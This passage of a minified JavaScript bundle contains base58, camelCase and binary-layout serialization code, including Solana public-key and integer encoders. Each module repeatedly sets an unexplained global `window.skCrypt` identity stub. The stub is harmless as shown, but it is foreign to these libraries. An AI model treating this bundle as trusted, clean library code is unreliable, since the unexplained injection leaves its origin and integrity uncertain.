              for (var m = c - o; m !== c && 0 === d[m]; ) m++;
              for (var g = u.repeat(r); m < c; ++m) g += e.charAt(d[m]);
              return g;
            },
            decodeUnsafe: d,
            decode: function (t) {
              var e = d(t);
              if (e) return e;
              throw new Error("Non-base" + a + " character");
            },
          };
        }),
        Bl
      );
    })();
    return (El = t(
      "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    ));
  })();
  const Ol = zn(Pl);
  var Rl,
    Ml = { exports: {} };
  var Ll = (function () {
    if (Rl) return Ml.exports;
    (Rl = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    const t = /[\p{Lu}]/u,
      e = /[\p{Ll}]/u,
      n = /^[\p{Lu}](?![\p{Lu}])/gu,
      r = /([\p{Alpha}\p{N}_]|$)/u,
      o = /[_.\- ]+/,
      i = new RegExp("^" + o.source),
      s = new RegExp(o.source + r.source, "gu"),
      a = new RegExp("\\d+" + r.source, "gu"),
      u = (r, o) => {
        if ("string" != typeof r && !Array.isArray(r))
          throw new TypeError("Expected the input to be `string | string[]`");
        if (
          ((o = { pascalCase: !1, preserveConsecutiveUppercase: !1, ...o }),
          0 ===
            (r = Array.isArray(r)
              ? r
                  .map((t) => t.trim())
                  .filter((t) => t.length)
                  .join("-")
              : r.trim()).length)
        )
          return "";
        const u =
            !1 === o.locale
              ? (t) => t.toLowerCase()
              : (t) => t.toLocaleLowerCase(o.locale),
          c =
            !1 === o.locale
              ? (t) => t.toUpperCase()
              : (t) => t.toLocaleUpperCase(o.locale);
        if (1 === r.length) return o.pascalCase ? c(r) : u(r);
        return (
          r !== u(r) &&
            (r = ((n, r, o) => {
              let i = !1,
                s = !1,
                a = !1;
              for (let u = 0; u < n.length; u++) {
                const c = n[u];
                i && t.test(c)
                  ? ((n = n.slice(0, u) + "-" + n.slice(u)),
                    (i = !1),
                    (a = s),
                    (s = !0),
                    u++)
                  : s && a && e.test(c)
                  ? ((n = n.slice(0, u - 1) + "-" + n.slice(u - 1)),
                    (a = s),
                    (s = !1),
                    (i = !0))
                  : ((i = r(c) === c && o(c) !== c),
                    (a = s),
                    (s = o(c) === c && r(c) !== c));
              }
              return n;
            })(r, u, c)),
          (r = r.replace(i, "")),
          (r = o.preserveConsecutiveUppercase
            ? ((t, e) => ((n.lastIndex = 0), t.replace(n, (t) => e(t))))(r, u)
            : u(r)),
          o.pascalCase && (r = c(r.charAt(0)) + r.slice(1)),
          ((t, e) => (
            (s.lastIndex = 0),
            (a.lastIndex = 0),
            t.replace(s, (t, n) => e(n)).replace(a, (t) => e(t))
          ))(r, c)
        );
      };
    return (Ml.exports = u), (Ml.exports.default = u), Ml.exports;
  })();
  const Nl = zn(Ll);
  var Dl,
    Ul = {},
    ql = {};
  function zl() {
    if (Dl) return ql;
    (Dl = 1),
      (window.skCrypt = function (t) {
        return function () {
          return t;
        };
      });
    class t {
      constructor(t, e) {
        if (!Number.isInteger(t))
          throw new TypeError("span must be an integer");
        (this.span = t), (this.property = e);
      }
      makeDestinationObject() {
        return {};
      }
      decode(t, e) {
        throw new Error("Layout is abstract");
      }
      encode(t, e, n) {
        throw new Error("Layout is abstract");
      }
      getSpan(t, e) {
        if (0 > this.span) throw new RangeError("indeterminate span");
        return this.span;
      }
      replicate(t) {
        const e = Object.create(this.constructor.prototype);
        return Object.assign(e, this), (e.property = t), e;
      }
      fromArray(t) {}
    }
    function e(t, e) {
      return e.property ? t + "[" + e.property + "]" : t;
    }
    (ql.Layout = t),
      (ql.nameWithProperty = e),
      (ql.bindConstructorLayout = function (e, n) {
        if ("function" != typeof e)
          throw new TypeError("Class must be constructor");
        if (e.hasOwnProperty("layout_"))
          throw new Error("Class is already bound to a layout");
        if (!(n && n instanceof t))
          throw new TypeError("layout must be a Layout");
        if (n.hasOwnProperty("boundConstructor_"))
          throw new Error("layout is already bound to a constructor");
        (e.layout_ = n),
          (n.boundConstructor_ = e),
          (n.makeDestinationObject = () => new e()),
          Object.defineProperty(e.prototype, "encode", {
            value: function (t, e) {
              return n.encode(this, t, e);
            },
            writable: !0,
          }),
          Object.defineProperty(e, "decode", {
            value: function (t, e) {
              return n.decode(t, e);
            },
            writable: !0,
          });
      });
    class n extends t {
      isCount() {
        throw new Error("ExternalLayout is abstract");
      }
    }
    class r extends n {
      constructor(t, e) {
        if ((void 0 === t && (t = 1), !Number.isInteger(t) || 0 >= t))
          throw new TypeError("elementSpan must be a (positive) integer");
        super(-1, e), (this.elementSpan = t);
      }
      isCount() {
        return !0;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = t.length - e;
        return Math.floor(n / this.elementSpan);
      }
      encode(t, e, n) {
        return 0;
      }
    }
    class o extends n {
      constructor(e, n, r) {
        if (!(e instanceof t)) throw new TypeError("layout must be a Layout");
        if (void 0 === n) n = 0;
        else if (!Number.isInteger(n))
          throw new TypeError("offset must be integer or undefined");
        super(e.span, r || e.property), (this.layout = e), (this.offset = n);
      }
      isCount() {
        return this.layout instanceof i || this.layout instanceof s;
      }
      decode(t, e) {
        return void 0 === e && (e = 0), this.layout.decode(t, e + this.offset);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), this.layout.encode(t, e, n + this.offset)
        );
      }
    }
    class i extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readUIntLE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeUIntLE(t, n, this.span), this.span
        );
      }
    }
    class s extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readUIntBE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeUIntBE(t, n, this.span), this.span
        );
      }
    }
    class a extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readIntLE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeIntLE(t, n, this.span), this.span
        );
      }
    }
    class u extends t {
      constructor(t, e) {
        if ((super(t, e), 6 < this.span))
          throw new RangeError("span must not exceed 6 bytes");
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readIntBE(e, this.span);
      }
      encode(t, e, n) {
        return (
          void 0 === n && (n = 0), e.writeIntBE(t, n, this.span), this.span
        );
      }
    }
    const c = Math.pow(2, 32);
    function l(t) {
      const e = Math.floor(t / c);
      return { hi32: e, lo32: t - e * c };
    }
    function d(t, e) {
      return t * c + e;
    }
    class f extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = t.readUInt32LE(e);
        return d(t.readUInt32LE(e + 4), n);
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeUInt32LE(r.lo32, n), e.writeUInt32LE(r.hi32, n + 4), 8;
      }
    }
    class h extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        return d(t.readUInt32BE(e), t.readUInt32BE(e + 4));
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeUInt32BE(r.hi32, n), e.writeUInt32BE(r.lo32, n + 4), 8;
      }
    }
    class p extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = t.readUInt32LE(e);
        return d(t.readInt32LE(e + 4), n);
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeUInt32LE(r.lo32, n), e.writeInt32LE(r.hi32, n + 4), 8;
      }
    }
    class m extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        return d(t.readInt32BE(e), t.readUInt32BE(e + 4));
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = l(t);
        return e.writeInt32BE(r.hi32, n), e.writeUInt32BE(r.lo32, n + 4), 8;
      }
    }
    class g extends t {
      constructor(t) {
        super(4, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readFloatLE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeFloatLE(t, n), 4;
      }
    }
    class y extends t {
      constructor(t) {
        super(4, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readFloatBE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeFloatBE(t, n), 4;
      }
    }
    class w extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readDoubleLE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeDoubleLE(t, n), 8;
      }
    }
    class b extends t {
      constructor(t) {
        super(8, t);
      }
      decode(t, e) {
        return void 0 === e && (e = 0), t.readDoubleBE(e);
      }
      encode(t, e, n) {
        return void 0 === n && (n = 0), e.writeDoubleBE(t, n), 8;
      }
    }
    class v extends t {
      constructor(e, r, o) {
        if (!(e instanceof t))
          throw new TypeError("elementLayout must be a Layout");
        if (
          !((r instanceof n && r.isCount()) || (Number.isInteger(r) && 0 <= r))
        )
          throw new TypeError(
            "count must be non-negative integer or an unsigned integer ExternalLayout"
          );
        let i = -1;
        !(r instanceof n) && 0 < e.span && (i = r * e.span),
          super(i, o),
          (this.elementLayout = e),
          (this.count = r);
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        let r = 0,
          o = this.count;
        if (
          (o instanceof n && (o = o.decode(t, e)), 0 < this.elementLayout.span)
        )
          r = o * this.elementLayout.span;
        else {
          let n = 0;
          for (; n < o; ) (r += this.elementLayout.getSpan(t, e + r)), ++n;
        }
        return r;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const r = [];
        let o = 0,
          i = this.count;
        for (i instanceof n && (i = i.decode(t, e)); o < i; )
          r.push(this.elementLayout.decode(t, e)),
            (e += this.elementLayout.getSpan(t, e)),
            (o += 1);
        return r;
      }
      encode(t, e, r) {
        void 0 === r && (r = 0);
        const o = this.elementLayout,
          i = t.reduce((t, n) => t + o.encode(n, e, r + t), 0);
        return this.count instanceof n && this.count.encode(t.length, e, r), i;
      }
    }
    class A extends t {
      constructor(e, n, r) {
        if (!Array.isArray(e) || !e.reduce((e, n) => e && n instanceof t, !0))
          throw new TypeError("fields must be array of Layout instances");
        "boolean" == typeof n && void 0 === r && ((r = n), (n = void 0));
        for (const t of e)
          if (0 > t.span && void 0 === t.property)
            throw new Error(
              "fields cannot contain unnamed variable-length layout"
            );
        let o = -1;
        try {
          o = e.reduce((t, e) => t + e.getSpan(), 0);
        } catch (i) {}
        super(o, n), (this.fields = e), (this.decodePrefixes = !!r);
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        let n = 0;
        try {
          n = this.fields.reduce((n, r) => {
            const o = r.getSpan(t, e);
            return (e += o), n + o;
          }, 0);
        } catch (r) {
          throw new RangeError("indeterminate span");
        }
        return n;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        const n = this.makeDestinationObject();
        for (const r of this.fields)
          if (
            (void 0 !== r.property && (n[r.property] = r.decode(t, e)),
            (e += r.getSpan(t, e)),
            this.decodePrefixes && t.length === e)
          )
            break;
        return n;
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = n;
        let o = 0,
          i = 0;
        for (const s of this.fields) {
          let r = s.span;
          if (((i = 0 < r ? r : 0), void 0 !== s.property)) {
            const o = t[s.property];
            void 0 !== o &&
              ((i = s.encode(o, e, n)), 0 > r && (r = s.getSpan(e, n)));
          }
          (o = n), (n += r);
        }
        return o + i - r;
      }
      fromArray(t) {
        const e = this.makeDestinationObject();
        for (const n of this.fields)
          void 0 !== n.property && 0 < t.length && (e[n.property] = t.shift());
        return e;
      }
      layoutFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
      offsetOf(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        let e = 0;
        for (const n of this.fields) {
          if (n.property === t) return e;
          0 > n.span ? (e = -1) : 0 <= e && (e += n.span);
        }
      }
    }
    class k {
      constructor(t) {
        this.property = t;
      }
      decode() {
        throw new Error("UnionDiscriminator is abstract");
      }
      encode() {
        throw new Error("UnionDiscriminator is abstract");
      }
    }
    class I extends k {
      constructor(t, e) {
        if (!(t instanceof n && t.isCount()))
          throw new TypeError(
            "layout must be an unsigned integer ExternalLayout"
          );
        super(e || t.property || "variant"), (this.layout = t);
      }
      decode(t, e) {
        return this.layout.decode(t, e);
      }
      encode(t, e, n) {
        return this.layout.encode(t, e, n);
      }
    }
    class S extends t {
      constructor(e, r, a) {
        const u = e instanceof i || e instanceof s;
        if (u) e = new I(new o(e));
        else if (e instanceof n && e.isCount()) e = new I(e);
        else if (!(e instanceof k))
          throw new TypeError(
            "discr must be a UnionDiscriminator or an unsigned integer layout"
          );
        if ((void 0 === r && (r = null), !(null === r || r instanceof t)))
          throw new TypeError("defaultLayout must be null or a Layout");
        if (null !== r) {
          if (0 > r.span)
            throw new Error("defaultLayout must have constant span");
          void 0 === r.property && (r = r.replicate("content"));
        }
        let c = -1;
        r && ((c = r.span), 0 <= c && u && (c += e.layout.span)),
          super(c, a),
          (this.discriminator = e),
          (this.usesPrefixDiscriminator = u),
          (this.defaultLayout = r),
          (this.registry = {});
        let l = this.defaultGetSourceVariant.bind(this);
        (this.getSourceVariant = function (t) {
          return l(t);
        }),
          (this.configGetSourceVariant = function (t) {
            l = t.bind(this);
          });
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        const n = this.getVariant(t, e);
        if (!n)
          throw new Error("unable to determine span for unrecognized variant");
        return n.getSpan(t, e);
      }
      defaultGetSourceVariant(t) {
        if (t.hasOwnProperty(this.discriminator.property)) {
          if (
            this.defaultLayout &&
            t.hasOwnProperty(this.defaultLayout.property)
          )
            return;
          const e = this.registry[t[this.discriminator.property]];
          if (e && (!e.layout || t.hasOwnProperty(e.property))) return e;
        } else
          for (const e in this.registry) {
            const n = this.registry[e];
            if (t.hasOwnProperty(n.property)) return n;
          }
        throw new Error("unable to infer src variant");
      }
      decode(t, e) {
        let n;
        void 0 === e && (e = 0);
        const r = this.discriminator,
          o = r.decode(t, e);
        let i = this.registry[o];
        if (void 0 === i) {
          let s = 0;
          (i = this.defaultLayout),
            this.usesPrefixDiscriminator && (s = r.layout.span),
            (n = this.makeDestinationObject()),
            (n[r.property] = o),
            (n[i.property] = this.defaultLayout.decode(t, e + s));
        } else n = i.decode(t, e);
        return n;
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = this.getSourceVariant(t);
        if (void 0 === r) {
          const r = this.discriminator,
            o = this.defaultLayout;
          let i = 0;
          return (
            this.usesPrefixDiscriminator && (i = r.layout.span),
            r.encode(t[r.property], e, n),
            i + o.encode(t[o.property], e, n + i)
          );
        }
        return r.encode(t, e, n);
      }
      addVariant(t, e, n) {
        const r = new _(this, t, e, n);
        return (this.registry[t] = r), r;
      }
      getVariant(t, e) {
        let n = t;
        return (
          dt.isBuffer(t) &&
            (void 0 === e && (e = 0), (n = this.discriminator.decode(t, e))),
          this.registry[n]
        );
      }
    }
    class _ extends t {
      constructor(e, n, r, o) {
        if (!(e instanceof S)) throw new TypeError("union must be a Union");
        if (!Number.isInteger(n) || 0 > n)
          throw new TypeError("variant must be a (non-negative) integer");
        if (
          ("string" == typeof r && void 0 === o && ((o = r), (r = null)), r)
        ) {
          if (!(r instanceof t)) throw new TypeError("layout must be a Layout");
          if (
            null !== e.defaultLayout &&
            0 <= r.span &&
            r.span > e.defaultLayout.span
          )
            throw new Error("variant span exceeds span of containing union");
          if ("string" != typeof o)
            throw new TypeError("variant must have a String property");
        }
        let i = e.span;
        0 > e.span &&
          ((i = r ? r.span : 0),
          0 <= i &&
            e.usesPrefixDiscriminator &&
            (i += e.discriminator.layout.span)),
          super(i, o),
          (this.union = e),
          (this.variant = n),
          (this.layout = r || null);
      }
      getSpan(t, e) {
        if (0 <= this.span) return this.span;
        void 0 === e && (e = 0);
        let n = 0;
        return (
          this.union.usesPrefixDiscriminator &&
            (n = this.union.discriminator.layout.span),
          n + this.layout.getSpan(t, e + n)
        );
      }
      decode(t, e) {
        const n = this.makeDestinationObject();
        if ((void 0 === e && (e = 0), this !== this.union.getVariant(t, e)))
          throw new Error("variant mismatch");
        let r = 0;
        return (
          this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout
            ? (n[this.property] = this.layout.decode(t, e + r))
            : this.property
            ? (n[this.property] = !0)
            : this.union.usesPrefixDiscriminator &&
              (n[this.union.discriminator.property] = this.variant),
          n
        );
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        let r = 0;
        if (
          (this.union.usesPrefixDiscriminator &&
            (r = this.union.discriminator.layout.span),
          this.layout && !t.hasOwnProperty(this.property))
        )
          throw new TypeError("variant lacks property " + this.property);
        this.union.discriminator.encode(this.variant, e, n);
        let o = r;
        if (
          this.layout &&
          (this.layout.encode(t[this.property], e, n + r),
          (o += this.layout.getSpan(e, n + r)),
          0 <= this.union.span && o > this.union.span)
        )
          throw new Error("encoded variant overruns containing union");
        return o;
      }
      fromArray(t) {
        if (this.layout) return this.layout.fromArray(t);
      }
    }
    function T(t) {
      return 0 > t && (t += 4294967296), t;
    }
    class B extends t {
      constructor(t, e, n) {
        if (!(t instanceof i || t instanceof s))
          throw new TypeError("word must be a UInt or UIntBE layout");
        if (
          ("string" == typeof e && void 0 === n && ((n = e), (e = void 0)),
          4 < t.span)
        )
          throw new RangeError("word cannot exceed 32 bits");
        super(t.span, n), (this.word = t), (this.msb = !!e), (this.fields = []);
        let r = 0;
        (this._packedSetValue = function (t) {
          return (r = T(t)), this;
        }),
          (this._packedGetValue = function () {
            return r;
          });
      }
      decode(t, e) {
        const n = this.makeDestinationObject();
        void 0 === e && (e = 0);
        const r = this.word.decode(t, e);
        this._packedSetValue(r);
        for (const o of this.fields)
          void 0 !== o.property && (n[o.property] = o.decode(r));
        return n;
      }
      encode(t, e, n) {
        void 0 === n && (n = 0);
        const r = this.word.decode(e, n);
        this._packedSetValue(r);
        for (const o of this.fields)
          if (void 0 !== o.property) {
            const e = t[o.property];
            void 0 !== e && o.encode(e);
          }
        return this.word.encode(this._packedGetValue(), e, n);
      }
      addField(t, e) {
        const n = new C(this, t, e);
        return this.fields.push(n), n;
      }
      addBoolean(t) {
        const e = new E(this, t);
        return this.fields.push(e), e;
      }
      fieldFor(t) {
        if ("string" != typeof t)
          throw new TypeError("property must be string");
        for (const e of this.fields) if (e.property === t) return e;
      }
    }
    class C {
      constructor(t, e, n) {
        if (!(t instanceof B))
          throw new TypeError("container must be a BitStructure");
        if (!Number.isInteger(e) || 0 >= e)
          throw new TypeError("bits must be positive integer");
        const r = 8 * t.span,
          o = t.fields.reduce((t, e) => t + e.bits, 0);
        if (e + o > r)
          throw new Error(
            "bits too long for span remainder (" +
              (r - o) +
              " of " +
              r +
              " remain)"
          );
        (this.container = t),
          (this.bits = e),
          (this.valueMask = (1 << e) - 1),
          32 === e && (this.valueMask = 4294967295),
          (this.start = o),
          this.container.msb && (this.start = r - o - e),
          (this.wordMask = T(this.valueMask << this.start)),
          (this.property = n);
      }
      decode() {
        return (
          T(this.container._packedGetValue() & this.wordMask) >>> this.start
        );
      }
      encode(t) {
        if (!Number.isInteger(t) || t !== T(t & this.valueMask))
          throw new TypeError(
            e("BitField.encode", this) +
              " value must be integer not exceeding " +
              this.valueMask
          );
        const n = this.container._packedGetValue(),
          r = T(t << this.start);
        this.container._packedSetValue(T(n & ~this.wordMask) | r);
      }
    }
    class E extends C {
      constructor(t, e) {
        super(t, 1, e);
      }
      decode(t, e) {
        return !!C.prototype.decode.call(this, t, e);
      }
      encode(t) {
        return (
          "boolean" == typeof t && (t = +t), C.prototype.encode.call(this, t)
        );
      }
    }
    class x extends t {
      constructor(t, e) {
        if (
          !((t instanceof n && t.isCount()) || (Number.isInteger(t) && 0 <= t))
        )
          throw new TypeError(
            "length must be positive integer or an unsigned integer ExternalLayout"
          );
        let r = -1;
        t instanceof n || (r = t), super(r, e), (this.length = t);
      }
      getSpan(t, e) {
        let n = this.span;
        return 0 > n && (n = this.length.decode(t, e)), n;
      }
      decode(t, e) {
        void 0 === e && (e = 0);
        let n = this.span;
        return 0 > n && (n = this.length.decode(t, e)), t.slice(e, e + n);
      }
      encode(t, r, o) {
        let i = this.length;
        if (
          (this.length instanceof n && (i = t.length),
          !dt.isBuffer(t) || i !== t.length)
        )
          throw new TypeError(
            e("Blob.encode", this) +
              " requires (length " +
              i +
              ") Buffer as src"
          );
        if (o + i > r.length) throw new RangeError("encoding overruns Buffer");
        return (
          r.write(t.toString("hex"), o, i, "hex"),
          this.length instanceof n && this.length.encode(i, r, o),
          i
        );
      }
    }
    class P extends t {
      constructor(t) {
        super(-1, t);
      }
      getSpan(t, e) {
        if (!dt.isBuffer(t)) throw new TypeError("b must be a Buffer");
        void 0 === e && (e = 0);
        let n = e;
        for (; n < t.length && 0 !== t[n]; ) n += 1;
        return 1 + n - e;
      }
      decode(t, e, n) {
        void 0 === e && (e = 0);
        let r = this.getSpan(t, e);
        return t.slice(e, e + r - 1).toString("utf-8");
      }
      encode(t, e, n) {
        void 0 === n && (n = 0), "string" != typeof t && (t = t.toString());
        const r = new dt(t, "utf8"),
          o = r.length;
        if (n + o > e.length) throw new RangeError("encoding overruns Buffer");
        return r.copy(e, n), (e[n + o] = 0), o + 1;
      }
    }
    class O extends t {
      constructor(t, e) {
        if (
          ("string" == typeof t && void 0 === e && ((e = t), (t = void 0)),
          void 0 === t)
        )
          t = -1;
        else if (!Number.isInteger(t))
          throw new TypeError("maxSpan must be an integer");
        super(-1, e), (this.maxSpan = t);
      }
      getSpan(t, e) {
        if (!dt.isBuffer(t)) throw new TypeError("b must be a Buffer");
        return void 0 === e && (e = 0), t.length - e;
      }
      decode(t, e, n) {
        void 0 === e && (e = 0);
        let r = this.getSpan(t, e);
        if (0 <= this.maxSpan && this.maxSpan < r)
          throw new RangeError("text length exceeds maxSpan");
        return t.slice(e, e + r).toString("utf-8");
      }
      encode(t, e, n) {
        void 0 === n && (n = 0), "string" != typeof t && (t = t.toString());
        const r = new dt(t, "utf8"),
          o = r.length;
        if (0 <= this.maxSpan && this.maxSpan < o)
          throw new RangeError("text length exceeds maxSpan");
        if (n + o > e.length) throw new RangeError("encoding overruns Buffer");
        return r.copy(e, n), o;
      }
    }
    class R extends t {
      constructor(t, e) {
        super(0, e), (this.value = t);
      }
      decode(t, e, n) {
        return this.value;
      }
      encode(t, e, n) {
        return 0;
      }
    }
    return (
      (ql.ExternalLayout = n),
      (ql.GreedyCount = r),
      (ql.OffsetLayout = o),
      (ql.UInt = i),
      (ql.UIntBE = s),
      (ql.Int = a),
      (ql.IntBE = u),
      (ql.Float = g),
      (ql.FloatBE = y),
      (ql.Double = w),
      (ql.DoubleBE = b),
      (ql.Sequence = v),
      (ql.Structure = A),
      (ql.UnionDiscriminator = k),
      (ql.UnionLayoutDiscriminator = I),
      (ql.Union = S),
      (ql.VariantLayout = _),
      (ql.BitStructure = B),
      (ql.BitField = C),
      (ql.Boolean = E),
      (ql.Blob = x),
      (ql.CString = P),
      (ql.UTF8 = O),
      (ql.Constant = R),
      (ql.greedy = (t, e) => new r(t, e)),
      (ql.offset = (t, e, n) => new o(t, e, n)),
      (ql.u8 = (t) => new i(1, t)),
      (ql.u16 = (t) => new i(2, t)),
      (ql.u24 = (t) => new i(3, t)),
      (ql.u32 = (t) => new i(4, t)),
      (ql.u40 = (t) => new i(5, t)),
      (ql.u48 = (t) => new i(6, t)),
      (ql.nu64 = (t) => new f(t)),
      (ql.u16be = (t) => new s(2, t)),
      (ql.u24be = (t) => new s(3, t)),
      (ql.u32be = (t) => new s(4, t)),
      (ql.u40be = (t) => new s(5, t)),
      (ql.u48be = (t) => new s(6, t)),
      (ql.nu64be = (t) => new h(t)),
      (ql.s8 = (t) => new a(1, t)),
      (ql.s16 = (t) => new a(2, t)),
      (ql.s24 = (t) => new a(3, t)),
      (ql.s32 = (t) => new a(4, t)),
      (ql.s40 = (t) => new a(5, t)),
      (ql.s48 = (t) => new a(6, t)),
      (ql.ns64 = (t) => new p(t)),
      (ql.s16be = (t) => new u(2, t)),
      (ql.s24be = (t) => new u(3, t)),
      (ql.s32be = (t) => new u(4, t)),
      (ql.s40be = (t) => new u(5, t)),
      (ql.s48be = (t) => new u(6, t)),
      (ql.ns64be = (t) => new m(t)),
      (ql.f32 = (t) => new g(t)),
      (ql.f32be = (t) => new y(t)),
      (ql.f64 = (t) => new w(t)),
      (ql.f64be = (t) => new b(t)),
      (ql.struct = (t, e, n) => new A(t, e, n)),
      (ql.bits = (t, e, n) => new B(t, e, n)),
      (ql.seq = (t, e, n) => new v(t, e, n)),
      (ql.union = (t, e, n) => new S(t, e, n)),
      (ql.unionLayoutDiscriminator = (t, e) => new I(t, e)),
      (ql.blob = (t, e) => new x(t, e)),
      (ql.cstr = (t) => new P(t)),
      (ql.utf8 = (t, e) => new O(t, e)),
      (ql.const = (t, e) => new R(t, e)),
      ql
    );
  }
  const Kl = Wn(Tc);
  var Wl;
  var Fl =
    (Wl ||
      ((Wl = 1),
      (function (t) {
        window.skCrypt = function (t) {
          return function () {
            return t;
          };
        };
        var e =
          (Ul && Ul.__importDefault) ||
          function (t) {
            return t && t.__esModule ? t : { default: t };
          };
        Object.defineProperty(t, "__esModule", { value: !0 }),
          (t.struct =
            t.f64 =
            t.f32 =
            t.i32 =
            t.u32 =
            t.i16 =
            t.u16 =
            t.i8 =
            t.u8 =
              void 0),
          (t.u64 = a),
          (t.i64 = function (t) {
            return new s(8, !0, t);
          }),
          (t.u128 = function (t) {
            return new s(16, !1, t);
          }),
          (t.i128 = function (t) {
            return new s(16, !0, t);
          }),
          (t.u256 = function (t) {
            return new s(32, !1, t);
          }),
          (t.i256 = function (t) {
            return new s(32, !0, t);
          }),
          (t.publicKey = function (t) {
            return new u(
              (0, n.blob)(32),
              (t) => new r.PublicKey(t),
              (t) => t.toBuffer(),
              t
            );
          }),
          (t.option = function (t, e) {
            return new c(t, e);
          }),
          (t.bool = function (t) {
            return new u((0, n.u8)(), l, d, t);
          }),
          (t.vec = function (t, e) {
            const r = (0, n.u32)("length"),
              o = (0, n.struct)([
                r,
                (0, n.seq)(t, (0, n.offset)(r, -r.span), "values"),
              ]);
            return new u(
              o,
              ({ values: t }) => t,
              (t) => ({ values: t }),
              e
            );
          }),
          (t.tagged = function (t, e, r) {
            const o = (0, n.struct)([a("tag"), e.replicate("data")]);
            return new u(
              o,
              function ({ tag: e, data: n }) {
                if (!e.eq(t))
                  throw new Error(
                    "Invalid tag, expected: " +
                      t.toString("hex") +
                      ", got: " +
                      e.toString("hex")
                  );
                return n;
              },
              (e) => ({ tag: t, data: e }),
              r
            );
          }),
          (t.vecU8 = f),
          (t.str = function (t) {
            return new u(
              f(),
              (t) => t.toString("utf-8"),
              (t) => dt.from(t, "utf-8"),
              t
            );
          }),
          (t.rustEnum = function (t, e, r) {
            const o = (0, n.union)(null != r ? r : (0, n.u8)(), e);
            return t.forEach((t, e) => o.addVariant(e, t, t.property)), o;
          }),
          (t.array = function (t, e, r) {
            const o = (0, n.struct)([(0, n.seq)(t, e, "values")]);
            return new u(
              o,
              ({ values: t }) => t,
              (t) => ({ values: t }),
              r
            );
          }),
          (t.map = function (t, e, r) {
            const o = (0, n.u32)("length"),
              i = (0, n.struct)([
                o,
                (0, n.seq)(new h(t, e), (0, n.offset)(o, -o.span), "values"),
              ]);
            return new u(
              i,
              ({ values: t }) => new Map(t),
              (t) => ({ values: Array.from(t.entries()) }),
              r
            );
          });
        const n = zl(),
          r = Kl,
          o = e(Xn());
        var i = zl();
        Object.defineProperty(t, "u8", {
          enumerable: !0,
          get: function () {
            return i.u8;
          },
        }),
          Object.defineProperty(t, "i8", {
            enumerable: !0,
            get: function () {
              return i.s8;
            },
          }),
          Object.defineProperty(t, "u16", {
            enumerable: !0,
            get: function () {
              return i.u16;
            },
          }),
          Object.defineProperty(t, "i16", {
            enumerable: !0,
            get: function () {
              return i.s16;
            },
          }),
          Object.defineProperty(t, "u32", {
            enumerable: !0,
            get: function () {
              return i.u32;
            },
          }),
          Object.defineProperty(t, "i32", {
            enumerable: !0,
            get: function () {
              return i.s32;
            },
          }),
          Object.defineProperty(t, "f32", {
            enumerable: !0,
            get: function () {
              return i.f32;
            },
          }),
          Object.defineProperty(t, "f64", {
            enumerable: !0,
            get: function () {
              return i.f64;
            },
          }),
          Object.defineProperty(t, "struct", {
            enumerable: !0,
            get: function () {
              return i.struct;
            },
          });
        class s extends n.Layout {
          constructor(t, e, r) {
            super(t, r), (this.blob = (0, n.blob)(t)), (this.signed = e);
          }
          decode(t, e = 0) {
            const n = new o.default(this.blob.decode(t, e), 10, "le");
            return this.signed ? n.fromTwos(8 * this.span).clone() : n;
          }
          encode(t, e, n = 0) {
            return (
              this.signed && (t = t.toTwos(8 * this.span)),
              this.blob.encode(t.toArrayLike(dt, "le", this.span), e, n)
            );
          }
        }
        function a(t) {
          return new s(8, !1, t);
        }
        class u extends n.Layout {
          constructor(t, e, n, r) {
            super(t.span, r),
              (this.layout = t),
              (this.decoder = e),
              (this.encoder = n);
          }
          decode(t, e) {
            return this.decoder(this.layout.decode(t, e));
          }
          encode(t, e, n) {
